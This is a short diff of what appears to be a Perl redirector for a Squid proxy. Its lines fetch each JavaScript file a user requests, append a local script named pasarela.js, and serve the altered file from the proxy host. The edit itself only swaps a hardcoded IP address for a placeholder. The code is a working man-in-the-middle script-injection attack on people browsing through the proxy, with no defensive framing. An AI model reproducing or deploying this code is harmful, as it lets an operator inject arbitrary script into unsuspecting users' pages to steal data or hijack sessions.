@@ -16,7 +16,7 @@ while (<>)
 		system("/usr/bin/wget", "-q", "-O", "/var/www/html/tmp/$pid-$count.js", "$url");
 		system("chmod o+r /var/www/html/tmp/$pid-$count.js");
 		system("cat /etc/squid3/pasarela.js >> /var/www/html/tmp/$pid-$count.js");
-		print "http://23.253.239.36:80/tmp/$pid-$count.js\n"; # REPLACE_IP
+		print "http://myip:80/tmp/$pid-$count.js\n"; # REPLACE_IP
 	}
 	else
 	{
